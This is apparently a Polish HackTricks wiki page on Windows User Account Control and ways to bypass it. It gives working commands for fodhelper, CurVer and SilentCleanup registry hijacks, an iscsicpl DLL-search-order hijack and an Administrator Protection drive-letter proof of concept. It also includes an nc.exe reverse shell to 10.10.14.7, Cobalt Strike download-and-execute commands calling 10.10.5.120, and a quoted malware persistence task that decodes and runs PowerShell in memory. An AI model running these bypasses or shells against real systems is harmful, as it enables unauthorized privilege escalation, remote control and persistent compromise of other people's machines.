# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja umożliwiająca wyświetlanie **monitu o zgodę na działania wymagające podwyższonych uprawnień**. Aplikacje mają różne poziomy `integrity`, a program z **wysokim poziomem** może wykonywać zadania, które **mogłyby potencjalnie narazić system na szwank**. Gdy UAC jest włączony, aplikacje i zadania zawsze **działają w kontekście zabezpieczeń konta niebędącego administratorem**, chyba że administrator jawnie zezwoli tym aplikacjom/zadaniom na uzyskanie dostępu do systemu na poziomie administratora. Jest to funkcja wygody, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uznawana za granicę bezpieczeństwa.<sup>[[2]](#references)</sup>

Więcej informacji o poziomach integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Gdy UAC jest wdrożony, użytkownik będący administratorem otrzymuje 2 tokeny: standardowy token użytkownika, służący do wykonywania zwykłych działań przy średnim poziomie integrity, oraz token z uprawnieniami administratora.

Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) szczegółowo omawia działanie UAC i obejmuje proces logowania, user experience oraz architekturę UAC.<sup>[[2]](#references)</sup> Administratorzy mogą używać security policies do konfigurowania działania UAC zgodnie z potrzebami swojej organizacji lokalnie (za pomocą secpol.msc) lub konfigurować je i wdrażać za pośrednictwem Group Policy Objects (GPO) w środowisku domeny Active Directory. Poszczególne ustawienia zostały szczegółowo omówione [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Dla UAC można ustawić 10 ustawień Group Policy. Poniższa tabela zawiera dodatkowe informacje:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Tryb zatwierdzania przez administratora dla wbudowanego konta Administrator](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Wyłączone)                                             |
| [User Account Control: Zachowanie monitu o podwyższenie uprawnień dla administratorów w trybie zatwierdzania przez administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Monit o zgodę dla plików binarnych innych niż Windows na bezpiecznym pulpicie) |
| [User Account Control: Zachowanie monitu o podwyższenie uprawnień dla standardowych użytkowników](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Monit o poświadczenia na bezpiecznym pulpicie)         |
| [User Account Control: Wykrywaj instalacje aplikacji i wyświetlaj monit o podwyższenie uprawnień](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Włączone; domyślnie wyłączone w wersji Enterprise)           |
| [User Account Control: Podnoś uprawnienia wyłącznie plikom wykonywalnym, które są podpisane i zweryfikowane](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Wyłączone)                                             |
| [User Account Control: Podnoś uprawnienia wyłącznie aplikacjom UIAccess zainstalowanym w bezpiecznych lokalizacjach](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Włączone)                                              |
| [User Account Control: Uruchamiaj wszystkich administratorów w trybie zatwierdzania przez administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Włączone)                                              |
| [User Account Control: Zezwalaj aplikacjom UIAccess na wyświetlanie monitu o podwyższenie uprawnień bez używania bezpiecznego pulpitu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Wyłączone)                                             |
| [User Account Control: Przełączaj na bezpieczny pulpit podczas wyświetlania monitu o podwyższenie uprawnień](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Włączone)                                              |
| [User Account Control: Wirtualizuj nieudane operacje zapisu plików i rejestru do lokalizacji poszczególnych użytkowników](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Włączone)                                              |

### Policies for installing software on Windows

**local security policies** („secpol.msc” w większości systemów) są domyślnie skonfigurowane tak, aby **uniemożliwiać użytkownikom niebędącym administratorami instalowanie oprogramowania**. Oznacza to, że nawet jeśli użytkownik niebędący administratorem może pobrać instalator danego oprogramowania, nie będzie mógł go uruchomić bez konta administratora.

### Registry Keys to Force UAC to Ask for Elevation

Jako standardowy użytkownik bez praw administratora możesz sprawić, aby „standardowe” konto było **proszone przez UAC o poświadczenia** podczas próby wykonania określonych działań. Wymaga to modyfikacji określonych **registry keys**, do czego potrzebne są uprawnienia administratora, chyba że istnieje **UAC bypass** lub attacker jest już zalogowany jako administrator.

Nawet jeśli użytkownik należy do grupy **Administrators**, zmiany te wymuszają **ponowne wprowadzenie poświadczeń konta** w celu wykonania działań administracyjnych.

**W praktyce jest to przydatne wyłącznie wtedy, gdy masz już elevated token, UAC bypass lub misconfiguration umożliwiającą zmianę tych kluczy; w przeciwnym razie sam zapis do rejestru zostanie zablokowany.**

Klucze rejestru i wpisy, które należy zmienić, są następujące (z ich wartościami domyślnymi w nawiasach):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Można to również zrobić ręcznie za pomocą narzędzia Local Security Policy. Po wprowadzeniu zmian operacje administracyjne wymagają od użytkownika ponownego wprowadzenia poświadczeń.

### Note

**User Account Control nie jest granicą bezpieczeństwa.** Dlatego standardowi użytkownicy nie mogą wydostać się ze swoich kont i uzyskać praw administratora bez local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode używa kontroli integralności, aby uniemożliwić procesom o wysokim poziomie integralności (takim jak web browsers) uzyskiwanie dostępu do danych o niskim poziomie integralności (takich jak folder tymczasowych plików internetowych). Jest to realizowane przez uruchamianie przeglądarki z tokenem o niskim poziomie integralności. Gdy przeglądarka próbuje uzyskać dostęp do danych przechowywanych w strefie o niskim poziomie integralności, system operacyjny sprawdza poziom integralności procesu i odpowiednio zezwala na dostęp. Ta funkcja pomaga zapobiegać atakom remote code execution, które mogłyby uzyskać dostęp do poufnych danych w systemie.
- Gdy użytkownik loguje się do Windows, system tworzy token dostępu zawierający listę uprawnień użytkownika. Uprawnienia są definiowane jako połączenie praw i możliwości użytkownika. Token zawiera również listę credentials użytkownika, czyli credentials używanych do uwierzytelniania użytkownika na komputerze i uzyskiwania dostępu do zasobów w sieci.

### Autoadminlogon

Aby skonfigurować Windows do automatycznego logowania określonego użytkownika podczas uruchamiania, ustaw **`AutoAdminLogon` registry key**. Jest to przydatne w środowiskach kioskowych lub do celów testowych. Używaj tej funkcji wyłącznie w bezpiecznych systemach, ponieważ ujawnia hasło w rejestrze.

Ustaw następujące keys za pomocą Registry Editor lub `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Aby przywrócić normalne zachowanie podczas logowania, ustaw `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Pamiętaj, że jeśli masz dostęp graficzny do ofiary, UAC bypass jest prosty, ponieważ możesz po prostu kliknąć „Yes”, gdy pojawi się monit UAC

UAC bypass jest potrzebny w następującej sytuacji: **UAC jest aktywne, Twój proces działa w kontekście o średnim poziomie integralności, a Twój użytkownik należy do grupy administratorów**.

Należy wspomnieć, że **znacznie trudniej jest wykonać UAC bypass, jeśli poziom zabezpieczeń jest ustawiony na najwyższy (Always), niż gdy jest ustawiony na którykolwiek z pozostałych poziomów (Default).**

### Fast triage z powłoki o średnim poziomie integralności

Przed podjęciem próby bypassu potwierdź, że znajdujesz się w odpowiednim scenariuszu, i dopasuj build hosta do znanych działających metod:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktyczne uwagi:
- Jeśli `EnableLUA=0`, nie potrzebujesz bypassu: dowolny token administratora może bezpośrednio zażądać wysokiego poziomu integralności.
- `ConsentPromptBehaviorAdmin=2` lub `5` to typowy scenariusz dla auto-elevate / bypassów opartych na COM.
- `Always Notify` podnosi poprzeczkę, ale nadal należy przetestować konkretny build, zamiast zakładać niepowodzenie: UACME nadal śledzi niektóre metody `AlwaysNotify compatible` na współczesnych buildach Windows.<sup>[[3]](#references)</sup>

### UAC wyłączone

Jeśli UAC jest już wyłączone (`ConsentPromptBehaviorAdmin` ma wartość **`0`**), możesz **uruchomić reverse shell z uprawnieniami administratora** (wysoki poziom integralności), używając czegoś takiego:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Bardzo** podstawowy UAC "bypass" (pełny dostęp do systemu plików)

Jeśli masz shell użytkownika należącego do grupy Administrators, możesz **zamontować udział C$** udostępniony przez SMB (system plików) lokalnie jako nowy dysk i uzyskasz **dostęp do wszystkiego w systemie plików** (nawet do folderu domowego Administratora).

> [!WARNING]
> **Wygląda na to, że ten trick już nie działa**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Techniki Cobalt Strike zadziałają tylko wtedy, gdy UAC nie jest ustawione na maksymalny poziom bezpieczeństwa
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** również mają kilka modułów do **bypass** mechanizmu **UAC**.

### Podwyższone interfejsy COM (`ICMLuaUtil` / `CMSTPLUA`)

Automatycznie podwyższane obiekty COM pozostają praktyczną powierzchnią UAC w nowszych kompilacjach. `ICMLuaUtil` jest nadal oznaczony w UACME jako działający w bieżących gałęziach Windows, a narzędzia offensive nadal dostosowują `CMSTPLUA`, łącząc interaktywny proces pulpitu, wykonanie 64-bitowe i czasami podszywanie się pod PEB/proces przed wywołaniem COM Elevation Moniker.<sup>[[3]](#references)</sup>

Praktyczne wskazówki:
- Preferuj proces **64-bitowy** w **interaktywnej sesji** użytkownika (zwykle `explorer.exe` lub jego proces potomny).
- Jeśli surowa powłoka zawiedzie, ponów próbę z implementacji BOF / UACME zamiast naiwnego wrappera `CreateProcess`.
- Zakładaj, że wykonanie procesu potomnego nastąpi w **oddzielnym podwyższonym procesie**; wiele BOF-ów nie podwyższa uprawnień bieżącego beacona w miejscu.

### KRBUACBypass

Dokumentacja i narzędzie: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Eksploity omijania UAC

[**UACME**](https://github.com/hfiref0x/UACME) to zbiór technik omijania UAC. Skompiluj go za pomocą Visual Studio lub MSBuild; kompilacja tworzy kilka plików wykonywalnych (na przykład `Source\Akagi\output\x64\Debug\Akagi.exe`), więc wybierz metodę odpowiednią dla docelowej kompilacji.<sup>[[3]](#references)</sup>\
Zachowaj ostrożność: niektóre bypasses uruchamiają widoczne programy lub monity, które mogą zaalarmować użytkownika.<sup>[[3]](#references)</sup>

UACME zawiera **wersję kompilacji, od której każda technika zaczęła działać**.<sup>[[3]](#references)</sup> Możesz wyszukać technikę wpływającą na używane przez Ciebie wersje:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ponadto, korzystając ze [strony](https://en.wikipedia.org/wiki/Windows_10_version_history), można ustalić wydanie Windows `1607` na podstawie wersji buildów.

Praktyczny workflow polega na tym, aby najpierw **ocenić build hosta**, a dopiero potem uruchomić pasującą metodę:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` szybko porównuje lokalny build ze znanymi metodami UAC, co pomaga szybko odrzucić nieaktualne PoC.<sup>[[4]](#references)</sup>
- `UACME` pozostaje najlepszym publicznym katalogiem do przyporządkowania bypassu do konkretnego builda. Nowsze wydania dodały nowe metody i ponownie przetestowały istniejące na **Windows 11 25H2**, dlatego przed założeniem, że stary wpis na blogu nadal ma zastosowanie bez zmian, sprawdź ponownie plik README i release notes.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Zaufany plik binarny `fodhelper.exe` jest automatycznie uruchamiany z podwyższonymi uprawnieniami we współczesnym Windows. Po uruchomieniu odpyta on poniższą ścieżkę rejestru użytkownika bez weryfikowania czasownika `DelegateExecute`. Umieszczenie tam polecenia pozwala procesowi o poziomie Medium Integrity (użytkownik należy do grupy Administrators) uruchomić proces o poziomie High Integrity bez monitu UAC.

Ścieżka rejestru odpytywana przez fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Kroki PowerShell (ustaw payload, a następnie go uruchom)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Uwagi:
- Działa, gdy bieżący użytkownik jest członkiem grupy Administrators, a poziom UAC jest domyślny/łagodny (nie ustawiony na Always Notify z dodatkowymi ograniczeniami).
- Użyj ścieżki `sysnative`, aby uruchomić 64-bitowy PowerShell z 32-bitowego procesu w 64-bitowym systemie Windows.
- Payload może być dowolnym poleceniem (PowerShell, cmd lub ścieżka do pliku EXE). Aby zachować dyskrecję, unikaj interfejsów UI wyświetlających monity.

#### Wariant hijack CurVer/extension (tylko HKCU)

Nowsze sample wykorzystujące `fodhelper.exe` omijają `DelegateExecute` i zamiast tego **przekierowują ProgID `ms-settings`** za pomocą wartości `CurVer` dla bieżącego użytkownika. Plik binarny z automatyczną eskalacją nadal wyszukuje handler w `HKCU`, więc do utworzenia kluczy nie jest potrzebny token administratora:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Po uzyskaniu podwyższonych uprawnień malware często **wyłącza przyszłe monity**, ustawiając `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a następnie wykonuje dodatkowe działania typu defense evasion (np. `Add-MpPreference -ExclusionPath C:\ProgramData`) i odtwarza persistence, aby działać z wysokim poziomem integralności. Typowe zadanie persistence przechowuje na dysku **skrypt PowerShell zaszyfrowany algorytmem XOR**, a następnie co godzinę dekoduje go i wykonuje w pamięci:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Ten wariant nadal usuwa dropper i pozostawia wyłącznie staged payloads, przez co wykrywanie wymaga monitorowania **`CurVer` hijack**, modyfikowania `ConsentPromptBehaviorAdmin`, tworzenia wykluczeń Defendera lub scheduled tasks, które odszyfrowują PowerShell w pamięci.<sup>[[5]](#references)</sup>

### UAC bypass via `SilentCleanup` task (`HKCU\Environment\windir`)

`SilentCleanup` uruchamia `cleanmgr.exe` z najwyższymi uprawnieniami i rozwija `%windir%` ze środowiska użytkownika. Jeśli kontrolujesz `HKCU\Environment\windir`, możesz przekierować to rozwinięcie do dowolnego polecenia i uzyskać high integrity bez okna zgody.<sup>[[8]](#references)</sup> Ta metoda nadal zasługuje na testowanie w nowszych buildach, ponieważ UACME utrzymuje tę technikę jako aktywną, a najnowsze śledzenie issue pokazuje, że Windows 11 24H2 może wymagać jedynie niewielkich zmian w cudzysłowach.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Jeśli zadanie cytuje ścieżkę w tej kompilacji, ponów próbę z payloadem kończącym się cudzysłowem (na przykład `cmd.exe"`). Po zakończeniu testów zawsze wyczyść `HKCU\Environment\windir`.

#### Więcej UAC bypass

Wiele klasycznych UAC bypass wykorzystujących przepływy UI, obiekty COM lub interakcję z desktopem wymaga **pełnej interaktywnej sesji** z ofiarą; zwykły shell `nc.exe` lub usługa działająca w **Session 0** często nie wystarczy.

Często można rozwiązać ten problem za pomocą sesji **meterpreter**. Wykonaj migrację do **process**, którego wartość **Session** wynosi **1**:

![Wskaż ms-settings na niestandardowe rozszerzenie (.thm) i przypisz to rozszerzenie do naszego payloadu - Więcej UAC bypass: Możesz to uzyskać za pomocą sesji meterpreter. Wykonaj migrację do procesu, którego wartość Session...](<../../images/image (863).png>)

(_explorer.exe_ powinno działać)

### UAC Bypass z GUI

Jeśli masz dostęp do **GUI**, możesz po prostu zaakceptować monit UAC, gdy się pojawi; tak naprawdę nie potrzebujesz technicznego bypass. Dlatego uzyskanie sesji GUI często wystarcza, aby ominąć praktyczne utrudnienia powodowane przez UAC.

Co więcej, jeśli uzyskasz sesję GUI, z której ktoś korzystał (potencjalnie przez RDP), **niektóre narzędzia mogą działać jako administrator**, dzięki czemu możesz **uruchomić** na przykład **cmd** bezpośrednio **jako administrator**, bez ponownego wyświetlania monitu UAC, korzystając na przykład z [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Może to być nieco bardziej **stealthy**.

### Głośny brute-force UAC bypass

Jeśli hałas jest akceptowalny, narzędzie takie jak [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) może wielokrotnie żądać podniesienia uprawnień, aż użytkownik je zaakceptuje.

### Własny bypass - podstawowa metodologia UAC bypass

Jeśli przyjrzysz się **UACME**, zauważysz, że **wiele UAC bypass wykorzystuje DLL hijacking** (często przez spowodowanie, aby binary z podniesionymi uprawnieniami załadował kontrolowaną przez atakującego bibliotekę DLL z zapisywalnej ścieżki). [Przeczytaj to, aby dowiedzieć się, jak znaleźć podatność DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Znajdź binary, który wykonuje **autoelevate** (sprawdź, czy po uruchomieniu działa na poziomie wysokiej integralności).
2. Za pomocą procmon znajdź zdarzenia "**NAME NOT FOUND**", które mogą być podatne na **DLL Hijacking**.
3. Prawdopodobnie będziesz musiał **zapisać** bibliotekę DLL w niektórych **chronionych ścieżkach** (takich jak C:\Windows\System32), do których nie masz uprawnień zapisu. Możesz to obejść za pomocą:
1. **wusa.exe**: Windows 7,8 i 8.1. Umożliwia wypakowanie zawartości pliku CAB do chronionych ścieżek (ponieważ to narzędzie jest uruchamiane na poziomie wysokiej integralności).
2. **IFileOperation**: Windows 10.
4. Przygotuj **skrypt**, który skopiuje bibliotekę DLL do chronionej ścieżki i uruchomi podatny binary z autoelevate.

### Inna technika UAC bypass

Polega na obserwowaniu, czy **binary z autoElevate** próbuje **odczytać** z **registry** **nazwę/ścieżkę** **binary** lub **command**, który ma zostać **wykonany** (jest to bardziej interesujące, jeśli binary wyszukuje te informacje w **HKCU**).

### UAC bypass przez `SysWOW64\iscsicpl.exe` + DLL hijack użytkownika `PATH`

32-bitowy `C:\Windows\SysWOW64\iscsicpl.exe` jest binary z **auto-elevated**, który można wykorzystać do załadowania `iscsiexe.dll` zgodnie z kolejnością wyszukiwania. Jeśli możesz umieścić złośliwą bibliotekę `iscsiexe.dll` w folderze **zapisywalnym przez użytkownika**, a następnie zmodyfikować `PATH` bieżącego użytkownika (na przykład przez `HKCU\Environment\Path`), aby ten folder był przeszukiwany, Windows może załadować DLL atakującego do procesu z podniesionymi uprawnieniami `iscsicpl.exe` **bez wyświetlania monitu UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktyczne uwagi:
- Jest to przydatne, gdy bieżący użytkownik należy do grupy **Administrators**, ale działa na poziomie **Medium Integrity** z powodu UAC.
- Kopia w **SysWOW64** jest istotna dla tego bypass. Kopię w **System32** traktuj jako osobny binary i niezależnie zweryfikuj jego działanie.
- Ten mechanizm jest połączeniem **auto-elevation** i **DLL search-order hijacking**, dlatego ten sam workflow ProcMon używany dla innych UAC bypass jest przydatny do potwierdzenia brakującego ładowania DLL.

Minimalny przebieg:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Pomysły na wykrywanie:
- Generuj alerty dotyczące użycia `reg add` / zapisów do rejestru w `HKCU\Environment\Path`, po których bezpośrednio następuje uruchomienie `C:\Windows\SysWOW64\iscsicpl.exe`.
- Wyszukuj `iscsiexe.dll` w lokalizacjach **kontrolowanych przez użytkownika**, takich jak `%TEMP%` lub `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Koreluj uruchomienia `iscsicpl.exe` z nieoczekiwanymi procesami potomnymi lub ładowaniem DLL spoza standardowych katalogów Windows.

### Nowsze badania warte osobnego sprawdzenia

Niektóre łańcuchy opublikowane po 2024 roku nie przypominają już klasycznych hijacków rejestru `HKCU\Software\Classes`. Na przykład poisoning cache activation-context może łączyć **remapowanie dysku** i **przekierowanie DLL**, aby przejść ze średniego do wysokiego poziomu integrity za pośrednictwem zaufanych interfejsów użytkownika / plików binarnych auto-elevated, takich jak `ctfmon.exe`, a następnie celów takich jak `fodhelper.exe`. Zamiast powielać tutaj duży PoC, sprawdź zwięzłe przykłady payloadów w:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack litery dysku przez mapę urządzeń DOS dla poszczególnych sesji logowania w Administrator Protection (25H2)

Pełny opis attack surface `RAiLaunchAdminProcess` / UIAccess dla Windows 11 25H2 znajdziesz na dedykowanej stronie:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Funkcja „Administrator Protection” w Windows 11 25H2 używa tokenów shadow-admin z mapami `\Sessions\0\DosDevices/<LUID>` dla poszczególnych sesji. Katalog jest tworzony leniwie przez `SeGetTokenDeviceMap` przy pierwszym rozwiązaniu `\??`. Jeśli attacker impersonuje token shadow-admin wyłącznie na poziomie **SecurityIdentification**, katalog jest tworzony z attackerem jako **owner** (dziedziczy `CREATOR OWNER`), co umożliwia tworzenie linków liter dysków mających pierwszeństwo przed `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Kroki:**

1. Z sesji z niskimi uprawnieniami wywołaj `RAiProcessRunOnce`, aby uruchomić pozbawiony promptu proces shadow-admin `runonce.exe`.
2. Zduplikuj jego primary token jako token typu **identification** i wykonaj jego impersonation podczas otwierania `\??`, aby wymusić utworzenie `\Sessions\0\DosDevices/<LUID>` z ownership po stronie attackera.
3. Utwórz w nim symlink `C:` wskazujący na storage kontrolowany przez attackera; kolejne operacje systemu plików w tej sesji będą rozwiązywać `C:` do ścieżki attackera, umożliwiając hijack DLL/plików bez wyświetlania promptu.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Jak działa User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Zbiór technik bypass UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – skaner zgodności i launcher bypass UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI wykorzystuje AI do generowania backdoorów PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operacja TrueChaos: wykorzystanie 0-day przeciwko celom rządowym w Azji Południowo-Wschodniej](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Omijanie ochrony administratora Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass UAC za pomocą zadania SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
